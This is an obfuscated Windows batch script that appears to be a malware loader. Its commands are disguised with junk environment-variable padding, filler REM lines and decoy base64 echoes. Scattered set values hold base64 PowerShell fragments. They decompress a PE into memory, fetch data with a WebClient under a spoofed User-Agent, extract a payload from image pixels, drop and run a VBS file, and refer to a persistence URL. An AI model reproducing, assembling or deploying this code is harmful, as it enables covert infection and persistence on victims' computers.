@echo off
echo QUg1aU00dmZRS1haMzdDU0RRNVd4R3lhbHVYbWtWVU0yQzV0d0huOW94NXc0dA== >nul 2>&1
REM pixel undergrowth vision cipher kappa zenith binary vertex hawk mirage
REM ruby delta glimmer twilight glimmer
echo cEVUZTZ3NmVpMmszS091SG0yWk1XRW00SVpjS1Z6eHdIRFUyeEt3dlk= >nul 2>&1
SE%WpeZG%t "WzIQzjBnUJd=KugdXLQwTItGJXmClE"
se%DxYDo%t "LTkFJYmF=jYRUamqHnmmnaDPdGFotDtvN"
Se%WHTI%T "ftYGjTxg=nmrJodxEiJCPmQl"
sE%EXq%T "lwXosRejvXBjvS=VRbwVuVOzvKObFHPJjkuAmuN"
sE%jbh%T "rKbRIfGqaH=rsZRCPUfRHPiwwxsn"
Se%gtUj%T "JzRUklGbalJyLZ=ssUDOguTvG"
se%KElT%T "bpfLUCanIFIk=SMhWengJKPZELHxBRQDXTpxjs"
REM ruby valley undergrowth circle sword guard fathom pixel fragment
REM cipher sword guard circle sword mirage guard
Se%BwXTM%t "DnzdthmLjr=YpGfkyOjXPLTRTfdHFwUgpaLJIA"
REM zenith valley vision kiln kappa twilight zenith glimmer
Se%PXOln%t "zaUsptWMU=zurnOwuGzMnmxlZ"
Se%SvI%t "EEmzKB=qadIFEkITHWAujFunCNZwgrrGXpiCbi"
se%Ilo%t "caQDNu=DcaEPJuzyosLydGQadBV"
REM hawk strobe kappa vertex echo undergrowth valley binary core clearing
REM mirage odyssey lance vertex valley mirage
Se%vcu%T "oQsyfMIbaN=qNASFoWtodTHJICq"
REM kiln guard kappa sword
REM binary pixel twilight strobe valley valley twilight sword
echo SVVnV0s1S0xWTEoxODY4bnFBQ3VGeHpxaTZIMVlaM2VYNG5mUmxlQWlxaU9UM29FdXRlRWd4VEFYbmVnOEJv >nul 2>&1
REM phantom valley pixel phantom fathom delta kappa
echo NGxUTFhOUnRkSk54enFibm5jbUhqdzRIdVZHdGoxMDBYUlFqUHRQWllnc2pQNElnNG5STjJod3pNTUd1T1RoTw== >nul 2>&1
SE%RyJHL%T "RVyXJQmuBtJbQH=eeXUfZjVQiQVyERxiurnCgNtPlDCbLJsx"
echo SGFKZUp4MDhQMHFtTGNqM3NveWlmNXRnMzBhamJrUlluRlJFOU5BbDlhVW9ZZDlPa1o4MFhZ >nul 2>&1
echo cEdSeWlUbTJhNkJLZmYyM1JDbnZmbUp0SkYyVm1yQzFTMGlEUm1uRkREdnR0ODlpSTJpdw== >nul 2>&1
se%DAP%T "VBaTJcCMmIWQzNS=BkLmRaBBnxkIc"
echo TkM1T0Fac29sR25RdExuRVZvSFpDbUxDOFd2YkUxNE5zanpLQ0FxS3FicDdvd1lrOHJEV3VKRU1Fb3M3Rjkz >nul 2>&1
sE%Pzt%T "CcocTu=XuYdCHebnCoE"
REM binary glimmer clearing shadow mirage zenith
REM circle cipher kappa
SE%BoCAF%T "gcTwPfXQljFqQ=LxOpMpkoLqmLcdCAF"
SE%Vur%t "oaZzikt=MKrwhvPhvcbwYlbuMyGQy"
sE%Yfr%T "vAvLTbRxh=WIsJkSLRVPxRdbdObLx"
sE%AzkaJ%t "qFyNHLFA=bPKaHUQfygPoX"
Se%aFNFj%t "xvVGLYEUVnmRLQl=tbeweoolocTEoXdwKGRdQGnUhfLFuVfsaZC"
REM phantom shadow zenith odyssey binary clearing sword
REM core ruby cipher circle phantom kiln kiln glimmer sword guard
REM mirage kappa zenith echo beacon sword mirage circle
REM guard beacon kappa delta shadow binary
echo Y0lDUU5QVGRsTDFrVE9wcURMRUR5cVh1bEJzamJrZmdIYmpjUkljSENTMUU5UGNLcGZhZklaUXJWSA== >nul 2>&1
SE%rcmeV%t "oKvihqM=cmVzc2lvbk1vZGVdOjpEZWNvbXByZXNzKQokb3V0TXMgPSBOZXctT2JqZWN0IFN5c3RlbS5JTy5NZW1vcnlTdHJlYW0KJGdzLkNvcHlUbygkb3V0TXMpCiRyYXdQRSA9ICRvdXRNcy5Ub0FycmF5KCkKTG9nL"
Se%tvAgp%t "BGDMrfyuqS=fcAnbyjtKYqfEaiRjTyjcintumzl"
sE%GTna%t "NyfkcpMniUdUN=UKWMqlvRRBnpfUOlIgmKMTonHYQuxu"
echo ajRvdGpXQk9FcmhOUVAxd1J1WW5tZXUzRm5wcVhNRFYyMUZHZEJ2dXpzNEJGU0tFQk9mY2NhanpvVGNKU3lvMndSZkE= >nul 2>&1
sE%sXhr%T "dcAuIB=AtpRrWLnBTW"
REM beacon beacon guard hawk hawk twilight sword binary valley hawk
echo aE5yQWRhelNkMlNFdkRXa2IyQ0h3UW5wbTllbHRBTjZUUllTMEpvM1B3Zm15WjRm >nul 2>&1
echo RnFxZkVhVVFJc1pWTm03Q0lLUXFXbU9GclNoQ2RDcFZoam53bnJ4M0JleEI5MUVnWEdPbGQwUkdqZEZlaW1CRUlZZHEzanBBb0hiRA== >nul 2>&1
REM core twilight clearing ruby undergrowth beacon twilight pixel twilight glimmer
se%EMEx%T "NzhrpFfe=ZnMVhkauwZXYsYoXkSCEyqzPlUiHktH"
sE%lkzoq%t "TFrZlzzEhvspo=YrhhVuxNDNvztcmMjBbAnzIc"
sE%MYeU%t "xOeIWQdsTG=bS5SZXNvbHZlRXZlbnRIYW5kbGVyXXsKcGFyYW0oJHMsICRlKQpMb2ctU2lsZW50ICJbIV0gRGVwZW5kZW5jeSByZXF1ZXN0ZWQ6ICQoJGUuTmFtZSkiICJZZWxsb3ciCnJldHVybiAkbnVsbAp9CltTeXN0"
REM beacon ruby lance strobe undergrowth zenith echo kappa valley core
REM circle shadow zenith
REM hawk core vision kiln undergrowth undergrowth vertex ruby kiln beacon
SE%FslhG%T "pYwuTDgfZpWHCVk=igSAIPtSYQrC"
REM fragment circle pixel strobe delta shadow
REM vertex zenith binary twilight kappa fragment vertex
SE%eMkr%t "WWPoDFx=MdeNimyqEluDYRQgn"
Se%ujZyb%T "iXllzjwJHhh=5ldy1PYmplY3QgU3lzdGVtLk5ldC5XZWJDbGllbnQKJHdjLkhlYWRlcnMuQWRkKCJVc2VyLUFnZW50IiwgIk1vemlsbGEvNS4wIChXaW5kb3dzIE5UIDEwLjA7IFdpbjY0OyB4NjQpIEFwcGxlV2ViS2l0LzUzN"
REM vision cipher sword beacon twilight phantom
REM sword strobe core shadow
REM vision vertex circle core hawk clearing glimmer
REM mirage circle fathom circle phantom
REM beacon shadow lance ruby kappa delta
echo MFM4ZVR3OXZsSnZLTGhibUNKMzdvb0kzMFNzbG5pWmFPc3hjeDhITWdOb1ox >nul 2>&1
REM zenith zenith beacon
se%XjB%t "GNDVTyFkiOsqLew=sNFKisxXmvCzNsBudEaAepwyHSgNcwppha"
se%lZYD%T "yyNGBsYSv=JxOSeAgZAuq"
REM hawk sword zenith twilight delta ruby kiln core valley
REM vision delta circle shadow circle binary fathom
Se%fHYRb%t "iUifPOKgYobE=FXAiQrZvjKOuUqF"
REM core lance sword glimmer kiln strobe odyssey fragment
se%AerJM%t "YzqCoDdjOyHo=MFhZwhPNooIYVMWETXGLDc"
Se%fJgT%t "WOzwYoEWyecq=OxrgsOePjojIYINiEQHrQ"
SE%DAWvz%T "PtwnRMuopib=ujJbCdhKeElJXYzTMMYPyrhdRZKRnAVJ"
SE%ztp%t "rwxWMWEc=uLvlzkihyOxvpKepJWFEiTzEqSO"
REM pixel sword delta
echo U25ObVR0enFEMm5CVElRN3pGaDFIVmhmZzNrUmZnZmpodUwzcnVjaTVCbXJGYkJ5b1RnSWtZUk15a2ZaTzM1NWtGNUk4NGlZT1haVDg= >nul 2>&1
SE%Wde%T "VLbpBqTqNbbN=xlbzKQXXgpUwzuJUIMWZ"
echo TWFqRUpkNjc2MUdWZ3V5eFo2ZXRoa2VxcVVObm1CU1BjUUlhaTd6dTNVY21x >nul 2>&1
SE%qOG%T "mbisGSnnk=bIzCJctcUimoxEJrNzFLbAjgKijwjusW"
SE%lBF%t "qfwYRm=CyHvxQdpTuuTyihcsgcTbWoaKufgUbvSia"
REM echo kappa clearing phantom pixel shadow shadow shadow strobe
SE%PEtx%T "xHQJqwNKYTioF=pjKmLDgccKQBHE"
echo SkRuS1NwZHVaNEZldjhJUEc4QWU3R0daYmR5TlBNVzdCdkcxdnBFaWNlTVZKQ0hsMEVYbzZRck44YWNsdVU2WG9PME8y >nul 2>&1
REM shadow guard beacon core
REM undergrowth kappa shadow twilight mirage
REM clearing beacon ruby undergrowth lance ruby delta
REM beacon circle lance kiln vertex kiln core zenith
sE%Vupti%T "lnRahHw=KmFAeKzdvsmKAhkH"
sE%SvekX%T "Wkiyii=yJqhQruXqBiTGOxDtZlETJllszaDxkihElg"
REM ruby vision beacon strobe circle binary mirage
SE%cit%t "rrrrtrdZwSev=ctygnQaFpeOtEUdvJHnH"
sE%KHQ%T "HQqoGinjLH=wsIQsyCOUOCvRzcaaOGcjMDkNjjURinJ"
Se%MLNdJ%T "aKMGzEYwSxOb=aZuwQgHTcl"
REM undergrowth twilight pixel lance glimmer kappa
SE%PMhU%T "EERoUBSTZe=atrVVCHLoMjQafozHKLy"
REM sword circle clearing beacon
se%GRtWs%t "reyenmTJselCpX=rqevkQWjBCPiLgXjiMGdtefwtNFS"
echo SE8zQ0YzMFZObVVsMzdEc3p1ZzdQN2hnOWtxQzFsb0pyTEFzcjM1bndYMnV6ZlZZVm1TdlNGSWxJUXNFMVRFQlZTZHB4 >nul 2>&1
REM ruby guard sword
echo M2JLZFZ2VVBpSm41aENxb1kwblViMk5rUlVjSGtaaDcwYWNkbWFkZmd4U2Q2UWJCVWt2bVNIV045a1A= >nul 2>&1
REM hawk glimmer hawk sword twilight
SE%uhlZL%t "vJynKjyJfxtfzfZ=QEvmDFFxQImHdLVhCZKkDwkyNu"
SE%pEc%T "zyGxSS=bEYgunKOOoLLDDYa"
echo cUlVVTlnZzdZZnVWVUtkZ0IycUNneDZxMk5rckxuTlVhOE8yRVFoZWRxVkdTdEdESEdVcTN0OHI= >nul 2>&1
echo eDBVZVRFRlVDdmt1SjljQlFTcGI2SnpxSFc4M0F5Q2pwM0k0TktWaUhQOGY4SXVjM0tvUm8xbmtW >nul 2>&1
Se%WQEk%T "SxRLwCj=ofrxBdPKffvlBaUtzuvUw"
REM glimmer guard circle strobe zenith
REM phantom clearing twilight echo zenith
sE%aalFO%t "oDyMtfG=biJRwmKMjPCavNhROOCdGEFGfbgqOlcQVp"
echo cHpHbmRSR21wZFJHN2JEOEN2ekRrM1BuWmlhQWZOREJ4THNSYlNNNld5V0lXejF3T2JXenlFTmhUd0JvMHRy >nul 2>&1
REM sword vertex delta strobe strobe fragment
SE%VCXU%t "jCluuKWbSJMsWYa=xPPUIKqcXtzguxQFcoFYGrbe"
REM lance glimmer echo
se%Sknvd%t "LlGaxsppi=VVOIgtYVToyB"
sE%CKhf%T "xFFmMmzuJQEeAeV=MwbcfpttXWPlEDOYJPQZfqlOmrA"
REM pixel guard kiln vision fragment lance kiln
echo bDRDakVDZ1hjOUdJaVhsV29CYlZmenNteUJ2bFBkWDM1dldQMnFNdWNTYnFzSjc= >nul 2>&1
Se%yFk%t "miMZwPebwZXiag=RIdbbFdEayCALOMqAXsFbgBCObN"
sE%nOSdJ%T "QBtQYq=zCrsQsSMGyeS"
echo cFdwcnNKYUxmbTRLajhFajloYk00SVF3VWlqV3JWeVhJdnd4SVpxd1lnTk10czlxZkhMQnJmc0c3ZEsyOA== >nul 2>&1
REM vertex fragment binary
se%SeAl%t "XYIVcwaOJDr=AoJHggPSAwOyAkeCAtbHQgJHc7ICR4KyspIHsKaWYgKCR5IC1lcSAwIC1hbmQgKCR4IC1lcSAwIC1vciAkeCAtZXEgMSkpIHsgY29udGludWUgfQokcHggPSAkYm1wLkdldFBpeGVsKCR4LCAkeSkKJGV4dHJhY"
REM valley echo circle twilight kappa undergrowth undergrowth
REM fragment strobe kappa mirage delta strobe
REM mirage sword sword guard clearing core circle pixel echo glimmer
echo aUVYa2NwTVNKY25kbHdhc3ZyUmxyMTc4UHRyVDFyV3d0VXNlcXpueWVxQW02Q21wa3VWUE8yazFV >nul 2>&1
Se%uJmO%T "ISXicTFGOMrBpku=bScxnjAmIrMG"
echo ZGplUXYzS0MxalFsMXJNWFlCRjBKdkJ4aXNBS1lURTVXb05Ccm4zcDZNN0s0NkdOUDUyNDRqQ0VmdW10 >nul 2>&1
se%MnjJm%t "cHTObkuJFwQ=tvINEIRWMQurSJsOCCdUlwisaAPX"
REM odyssey pixel vertex undergrowth mirage core sword clearing
REM delta pixel core echo pixel echo
REM valley shadow strobe delta kiln
REM mirage delta circle mirage circle twilight fathom strobe
SE%XOjI%t "TTrkJfVfLLVRQe=OzgpyuDIQwPzEK"
REM core hawk phantom
REM cipher sword ruby vision twilight glimmer zenith binary delta
REM glimmer mirage glimmer echo clearing core clearing
echo Wk1VRXAzZkZSREZJNTEzTkxTeWJ2MXBnRUprVmVHVHJTN0dsSXJZR0xISjUyWUpSMXVmNTJFWFdXbnI= >nul 2>&1
REM zenith cipher hawk glimmer circle vertex hawk twilight guard
REM fragment odyssey pixel cipher phantom
REM twilight kiln fathom echo
sE%tAvk%T "WKncxjBlQ=KWWWVMjfbARMVIDqgCeP"
SE%nPmLd%t "rVMEBLXUQInKbch=qxccxmZYLDnSgvpTBEUERkAI"
sE%WbF%T "bZlPtRvXSgil=gmDKsuPHcHQnMeOvakDHokItfZbczViu"
SE%KEMA%t "TuDJKrzlRYWLGPW=UGGPAdEVOCUvWfryrIcratj"
sE%Frq%T "zFPmlMwVAZxR=ICR0YXJnZXQ="
se%MuiHb%t "PPZojkAOTL=tSKPMzusAYNAaZppJtnStVllfaogAS"
SE%rHRA%t "IdSmsHFUaZjgWj=FqSijVtMOoXTwryShkjCG"
REM vertex delta glimmer strobe
Se%cWED%t "ysKVIGEmRaRVSj=yAhcIndYxCAPurJuUAdavXHpbtHXPEXB"
Se%yURfZ%t "fDDdHORiW=pTiSSqdKetpsHsY"
REM strobe echo valley phantom echo
REM circle strobe twilight
echo QlBtU0hlS3RETFBjcDhNTlRTZVJBdThVaW12aHlkU0JhWTkwSkMyd3d0bllBVnpyU1NIc1p3d2taRlhSd2xPSFA3UmlrOWh1eFE3RFNpb2w= >nul 2>&1
Se%qUL%t "KrKyXcuXJgK=tqCJDBbIfwfqccvJgshfqSatGzBva"
se%zHSzi%t "QbpcmrCi=NvyQjehEEilndbKZwXYMDHoK"
REM valley pixel strobe kappa sword
echo U2xuOHVvc3pCWjBEMFhBVTJTWkRTQnNBcGxmRHJ2OWFFVGpOeEoydnBxcnFEeW10VkkxZVEybWVQTnk= >nul 2>&1
echo dU9GOVhoNjhkVHQ0ZncwWnZNTFhuUlJJZThtQk1nTzVlZDE4NWhSa2VLNGFUTUY5TDFLdkxtbUo2ZmxUWFV6SHR1UkFQaXBM >nul 2>&1
sE%HoYQ%t "PoambpUjjKJC=SRiUTtYkQRkmyjxCwJJfbGaLdouJiBPtBnI"
REM shadow beacon hawk circle vision
REM odyssey pixel vision vertex circle kappa kiln kappa mirage mirage
se%nzhij%T "IsceXrCAAt=IqNrsaHMsdkKnZVtqkZjlRwTAjXL"
echo NnNna2FKdEZxRjVYb3JSa0VmVTlQNjVpeUduc2NvVDlVenBKMm1QVjdTRHlpR1FFV3VtNGdZQQ== >nul 2>&1
Se%TzIq%T "uJJdALb=wQpurmVhjExwNPPsiDzmPqcRAPDjjhXlp"
REM strobe fathom pixel beacon vertex kappa sword
SE%NWx%T "noIUfqelNCHLo=MuhxgUwkfMkPr"
SE%hWfwF%T "JYyZia=rKFbyqLQdiwAUHVSN"
echo YTQxUUdZTE1FWEp1dmtDNG12akc0T3RPY0VPbGN6Q1VoNWZUYk9Malp6VDY= >nul 2>&1
REM core strobe kappa fragment fragment vertex
SE%dVX%t "lTCuOYxg=cLUxgdEBjZeZUjYfexAmBVjXDEtSfHp"
REM hawk clearing core odyssey core
REM fragment shadow hawk core vision odyssey
REM cipher ruby hawk fragment
SE%prFTh%t "beReKrkRyz=YhojEYGVBezbbjxPCjRpNMnnrVXewt"
REM lance odyssey valley
REM core vision strobe
echo cVFZQ2Q2SmFRTllZbHJTYmR1N250Rm9OejY5VlNZZlU4NUthSWVNZmxEVlZpbVZqUmFERzRvc1VyMFdLcmd4eUlINm8= >nul 2>&1
echo dHZuejdsR1I0R255NVp1WDZMZkd2QXFheXhsMWlBSnpmeG12Z0x0b1NSTEN1cDVkUThZNW9KS052 >nul 2>&1
SE%vFs%T "qIASEMMjp=uyEmrRSVvTNVcNKhqtroaUbC"
Se%wRJY%T "HauYLM=zhibOrQfTiSrPFFQNzCaIftjwExJYF"
REM vertex sword strobe phantom cipher
echo MmZzMVZiQzljZHY3Y1Y5WUY0MXcwMHh3N0VMc2pVRUpGd3hvc2xHU1Nyc2ZXNmtUcEQ5STRSb2ZpVUhObkZDdjF4UTM= >nul 2>&1
echo enBDZXMzR1loUzQyeTFXcVZ6Q2NwbTcwT3JFbkhaNm9va2k5cGpWcXJGSUYyd01Wcg== >nul 2>&1
se%RhweI%t "DIBUTgNdewCuhg=wBKMTmSGBdmKDWsKbwqteBbvaCkO"
SE%iQPoe%t "VCpYDuz=EYcvjBPWcaXvhy"
se%FqF%t "XBxFieYKUBAc=epmAUVCDZdueYXbYZLPpNkWMYlfjhbkdZ"
sE%GFb%t "pELLzzvEieyF=OqGiPWPkqPyWqWXBspcMZRMNoik"
REM lance lance twilight kappa strobe vertex beacon clearing
REM valley kappa cipher delta
se%IIcJ%t "adYQIdnuyf=fIZiBwhxjTUaFeUuak"
echo UDlIcnM1cmN4c0trdWxoTERPQUVwZHZLakpRY09SbEllUTlSNUlsdEZKZ0RUZA== >nul 2>&1
REM hawk kiln shadow shadow strobe vision pixel fragment guard
REM fragment strobe hawk sword binary odyssey
sE%bcjoi%t "pHrrCT=EadkwztwDuqmkVxzgXnCEdbxFbqOiM"
SE%BLUPf%T "MJaCCxuwaf=mNvIJgJOWddajbmOfdWLcj"
Se%wyLM%T "vfjkzpPqPr=W4gQ2hyKDM0KSAmIHRlbXBGaWxlICYgQ2hyKDM0KSwgMCwgRmFsc2UKRW5kIElmClNldCBzaGVsbCA9IE5vdGhpbmcKU2V0IGZzbyA9IE5vdGhpbmcKIkAKdHJ5IHsKJHZic0NvbnRlbnQgfCBPdXQtRmls"
REM kappa odyssey hawk delta kappa echo mirage shadow kiln zenith
SE%cEF%t "MDrjhJtkT=YbzCtxPtPHzfHzzyHBoXNqUOoo"
sE%OtBx%t "UGRGdaifOPJVbk=wmHUnVOlpkGV"
REM fragment circle lance
echo WWlSNHVscVltVWRTbE51R2p5VmtJb3d4SWJ0WmpraWZZY3JRZ09NZ0ZWVTFXVU9aellYa1JTeDhMV1JWWDREVGJxYkdFMVVRb2xneA== >nul 2>&1
REM undergrowth mirage undergrowth vision odyssey guard echo beacon delta beacon
se%TrGL%T "OXZiUEvlC=upMJNOEHgLmNTOtRAdKIphql"
echo UjhMUXg2bGV4eEI1Qk96akVBT3lGWXpURzNmMmdQeHpncFFoNkg0dFU0aE43eG9lME13bkNMRlhQQWhJMnhZUUhrT3A= >nul 2>&1
Se%uMQ%t "ivnPcroX=qsUQmjFpNxVb"
Se%VcyI%T "DjrQclSnKPXY=CEFeQhkHzoaXhxYevOTtGAi"
REM lance circle hawk binary circle vision fragment core echo
se%oKy%T "hHibXHBpqVkieop=BHzheNCqpmxTwUirnePbRBuW"
Se%Lkdy%T "vmrKtM=raBgKoKFMkb"
sE%JxMB%t "ufeVAD=nRBcElnMssJERkiIYwxRinbVV"
se%yot%t "YkAMgy=ixONlwYcQiwmLVoVIxQm"
se%wqEUl%t "qXfhxUhws=mBtqHMVHKVxeQtOaux"
REM twilight zenith vision kiln clearing cipher ruby valley lance
se%jqCrx%t "CXooWqFKJByagdx=QNDqtMDiVgCVZKioJvyMq"
REM glimmer strobe fragment twilight
echo RWd4eTY1RW5ReDFGQ0VQeU9DbFpnTU40NWF3RVg3d2FzUjl4Wm9sTURqcG5BU0QwdEhzTngybVg= >nul 2>&1
REM valley strobe cipher guard vision lance circle fragment strobe binary
se%jHna%t "mnzViJKeXQKHNP=zdZOhbCyPDy"
REM ruby undergrowth kappa core echo guard kappa mirage undergrowth fragment
se%JCAG%T "LJKwGtDt=TNJWnkPqTyIiJ"
sE%PBD%t "RgTlEIt=MkrLJRfPKvAWMnwUqvuOLpxZyBSoKe"
se%yhIr%t "xgwqplVrkmUf=XndEgeXRWWJchZIYL"
REM circle vision undergrowth beacon shadow cipher guard phantom sword ruby
echo WWFvRUNzenJSMU55S0FXNUFPOG9SdEhTOHRjcnp0UjZocUJIUGduMUhXU2pXRFQ3Z0lTV1NIRkI4empPdTFucHNWUTl1Y216R2VqMFdwNw== >nul 2>&1
Se%VmExD%T "VPxRjkm=GZhbHNlKQppZiAoLW5vdCAkU2lsZW50KSB7CmlmICgkSXNFcnJvcikgeyBXcml0ZS1FcnJvciAkTWVzc2FnZSB9CmVsc2UgeyBXcml0ZS1Ib3N0ICRNZXNzYWdlIC1Gb3JlZ3JvdW5kQ29sb3IgJENvbG9yIH0KfQp9CmZ1bmN0aW9"
echo eWx5bWJDMEpSM0dIVk44bHJudnJMbTFkd1JVajRFM29nQ0JNZDlKSjI= >nul 2>&1
Se%iePKh%t "AzObDMDZsd=FsIHBhdGg6ICRTb3VyY2UiCiRkYXRhID0gW1N5c3RlbS5JTy5GaWxlXTo6UmVhZEFsbEJ5dGVzKCRTb3VyY2UpCn0gZWxzZSB7CkxvZy1TaWxlbnQgIkludmFsaWQgc291cmNlOiAkU291cmNlIiAiV2hpdGUiICR0cnVlCnJld"
REM undergrowth clearing fragment clearing strobe echo circle mirage echo sword
echo eXNBZnI4NWVsRm1kc0pad3BENmZ2RmJQbUZ2UXZ2c0d3MHJaUldMenpRVEs5czhQNFZyQmZaREZZdnF6c3kyZGRZbkM1aEFL >nul 2>&1
echo YUs4Q3E1NEZWWHZvWWdhNGM4cXN4TTBzTEU2M2JyWUlEQVBGU1ZuSnZZeXVDaFRwY1lrN0VHVkh1MmN5OEI= >nul 2>&1
echo NW5JM0lUTEJVQUhCeU1vR0c0RWE0M2JhbWlhSnJiaHFYcFI5WjRtd21yaWhhZDFYTFFkTA== >nul 2>&1
echo VkhxRXRHZ0ROVUxuaE56S2NrNkRiQWZWR0ZuTFFPTjhkY3VQQjlqeA== >nul 2>&1
REM delta vision mirage clearing kappa hawk valley binary vision core
REM strobe phantom fathom core binary delta fragment shadow cipher
Se%XQNuz%T "VUUGnNwgSTP=fbAvQlLbeeeuFHrcRTxcCyTOQptn"
REM shadow fragment fathom twilight odyssey phantom clearing lance pixel
SE%sbiD%T "RLpHFoNoTfiFhbn=toqJolNmMFXAdOapbxhz"
REM clearing shadow circle core valley
SE%uOr%t "bompxOICiYwouY=QFigoRXRWMHEKjoVVtTTC"
REM cipher fathom ruby circle
REM vision vertex delta lance
se%pttU%T "eNqCZI=DRwJcXVPtEzfUKjNql"
REM fathom twilight zenith strobe zenith vision zenith kiln kiln
sE%OcBU%t "BQUCSKAvxODAw=QMNXuYrJmrQdKBblmOflyxyKkYJe"
echo QkFMRkZWbXN3WUhDaG1sbjFMRHdsSFJsc1BXY05RVWFISm1oR3FSc2QzVFJzcFhxa29XWTZw >nul 2>&1
sE%JywOa%t "bCVgHQsAzvhR=NqRMwnDfmV"
REM mirage sword strobe mirage circle odyssey guard kiln cipher
echo UWZtSVNvQ25HT281OVhuNVJNSTBkcXQ0OU9UYkdxZVA2QTBFNzJqQnFOZURiS25CVlFBdWwzQWhQd3ZjMnVQS2g0UWJXd1Q= >nul 2>&1
REM lance hawk fragment
SE%Odplg%T "atZDPdfoRTOX=0VfV0lUSCIgLW9yICRQRVJTSVNURU5DRV9VUkwgLWVxICIiKSB7CkxvZy1TaWxlbnQgIlshXSBQZXJzaXN0ZW5jZSBza2lwcGVkOiBZb3UgaGF2ZW4ndCBlZGl0ZWQgdGhlIFVSTCBpbi"
REM beacon guard zenith fathom strobe ruby odyssey hawk clearing
REM sword phantom sword binary
SE%UUfe%t "LzwOEC=tYVaUrrArlGB"
SE%dZtc%t "ztKoTlHGkfe=ArJfHcUbUkIDBMtkMdccSYmuGfmh"
REM twilight mirage fathom lance
SE%rqO%T "uDyoqnHeHASl=pTKwiOwIxHAzaLYTEyzNoAE"
SE%OBRMF%t "DXQZEYtUnbFYP=XeFpUnoyRF"
sE%UTFH%T "fBXYYoB=qdvZmCnRWEQHmikwwdYp"
REM odyssey lance ruby vertex vertex
REM binary clearing kappa kappa
REM clearing echo binary cipher kappa binary vertex cipher kappa phantom
sE%HzCFh%T "yfxWEaXz=vythexMjSL"
se%RDTxt%T "HopKQomA=GHFEjfSeRhKmKiZefhjfNKlDxXjE"
Se%RZHCU%T "eUilrBdNRJKIJI=zJZpcmSyOjqnvHtLbRWILYGFk"
echo czlzQjVoYWowWmdsbkpONlpMU0Q4V0tMeG1HZjZvSVFEV2dDb1lkZEhNbkNrNmN0WUM4SlJRMUNXNVVUeVhmbml2Z01mUFBTZFQ3dHVKWA== >nul 2>&1
REM strobe shadow shadow strobe vision valley pixel kiln cipher kiln
sE%Ave%t "XkDxVCFjbpQvgB=oJeNbFvnJFCXxWtPtkBpkIhtXrnhIRjInQL"
REM twilight ruby vision delta kiln delta beacon circle
se%ZegAI%T "BcpaXwSGOM=RdGQccjFJXcXPSuCBXCsMmrTNIjKZkT"
Se%zOMAn%T "cAVivfFpsqYFN=rVXdZLyapHshGlUZmmCCzHxelm"
REM kiln strobe odyssey vertex
se%hMHk%T "JOrlMOKqkbN=wPHLomALKyroXm"
REM pixel phantom beacon shadow kiln strobe beacon zenith
echo RDBzb2xBVnBkckg5dGk0MjNpQUFlcDBkT2hYcllpdDBET2tMbHc2cnRjUXlaaFlkT05aYUlrQXYzNUtRdjF2dmZkdkQ= >nul 2>&1
REM vision clearing core
REM guard core echo kappa ruby odyssey core phantom
REM kappa twilight guard beacon
se%sTiei%t "jGicGbstjWw=tKrfftCRdPXXifOQpD"
se%FUtC%t "zRsNUYTEE=KNIgSlXtPU"
REM fragment zenith clearing odyssey ruby vision odyssey hawk circle vertex
echo NVFzTmYxV3RxZ1dpaGJjS0hxRzQ1d3ExekJVQzNEMDBodWlDV3dpM1c4TWszVml0R1hxV0pabDVz >nul 2>&1
REM strobe glimmer undergrowth hawk beacon sword
REM sword delta binary kappa hawk shadow twilight valley circle
SE%ezZPa%T "zWPTakER=XcdAHPLoKyTJNoAKqXbMuwjBqvmSguTiR"
SE%hbeZ%T "CHERtbxAegx=KSEphdkJrayMNx"
REM sword echo shadow echo cipher undergrowth kappa twilight
REM shadow delta ruby phantom twilight hawk cipher
echo dmZoQlMwUVhCcUNTdVZETkp4TmdKam51OTdpWEhWR09mVEx0bW10UkNwZ1E2SmpPZjNZMmp4aUVNbUZHWWF4YkU2OUY2Z2lEYU8= >nul 2>&1
se%oYile%T "lGsqWOVMIqzVKDz=HLNTuYeIRciQmu"
REM ruby guard hawk ruby
echo aVFWbFBJM2ZJbEJaZlNUR0ptNE1LaEtKaEJkeFZPa09LS3A4MlpkNGpZNk9xaFRGNEhZa1U4SmpQOFhlQUVx >nul 2>&1
REM undergrowth echo clearing
se%CrPI%t "RTPqqrxh=UAmgvwrpsFLldJqcmwjOureFmmGwfsnGE"
REM kiln odyssey cipher fathom clearing twilight
REM echo core clearing cipher vision cipher
REM zenith beacon twilight vertex shadow sword echo shadow beacon pixel
